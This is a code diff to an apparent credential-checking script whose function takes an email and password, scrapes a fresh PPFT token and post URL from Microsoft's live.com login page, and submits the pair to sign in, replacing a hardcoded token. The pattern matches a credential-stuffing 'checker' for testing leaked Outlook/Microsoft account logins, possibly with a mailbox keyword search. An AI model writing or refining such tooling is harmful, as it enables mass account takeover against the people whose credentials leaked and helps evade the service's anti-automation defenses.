@@ -109,24 +109,57 @@ def _attempt_check(email, password, search_keyword=None):
     session.max_redirects = 8
 
     try:
-        # ── Step 1: Login POST ──
-        login_url = (
-            "https://login.live.com/ppsecure/post.srf?"
+        # ── Step 0: GET login page to extract fresh PPFT + cookies ──
+        auth_url = (
+            "https://login.live.com/oauth20_authorize.srf?"
             "client_id=0000000048170EF2"
             "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
             "&response_type=token"
             "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
             "&display=touch"
             f"&username={urllib.parse.quote(email)}"
-            "&contextid=2CCDB02DC526CA71&bk=1665024852"
-            "&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
         )
 
+        pre_resp = session.get(auth_url, headers={
+            "User-Agent": USER_AGENT,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate",
+        }, timeout=20)
+
+        pre_body = pre_resp.text
+
+        # Extract PPFT token
+        ppft = _parse_lr(pre_body, 'name="PPFT" id="i0327" value="', '"')
+        if not ppft:
+            ppft = _parse_lr(pre_body, "sFT:'", "'")
+        if not ppft:
+            ppft = _parse_lr(pre_body, 'sFT:"', '"')
+        if not ppft:
+            result["status"] = "retry"
+            result["detail"] = "no PPFT token"
+            return result
+
+        # Extract urlPost (the actual POST target)
+        url_post = _parse_lr(pre_body, "urlPost:'", "'")
+        if not url_post:
+            url_post = _parse_lr(pre_body, 'urlPost:"', '"')
+        if not url_post:
+            url_post = (
+                "https://login.live.com/ppsecure/post.srf?"
+                "client_id=0000000048170EF2"
+                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                "&response_type=token"
+                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
+                "&display=touch"
+                f"&username={urllib.parse.quote(email)}"
+            )
+
+        # ── Step 1: Login POST with fresh PPFT ──
         post_data = (
             "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
-            "&hpgrequestid=&PPFT=-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz"
-            "*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR%21JjAUTPM*Am5lkZU6Sa%21wIdI6zYnUI8VYQ"
-            "HQOCJLb*lRsaiV5MhGQieznZ%21EynMuuBHbBfLr28btqCBqLhzZXQ%24%24"
+            "&hpgrequestid="
+            f"&PPFT={urllib.parse.quote(ppft)}"
             "&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
             "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
             f"&login={urllib.parse.quote(email)}"
@@ -148,7 +181,7 @@ def _attempt_check(email, password, search_keyword=None):
             "Accept-Encoding": "gzip, deflate",
         }
 
-        resp = session.post(login_url, data=post_data, headers=login_headers,
+        resp = session.post(url_post, data=post_data, headers=login_headers,
                             allow_redirects=True, timeout=30)
 
         body = resp.text
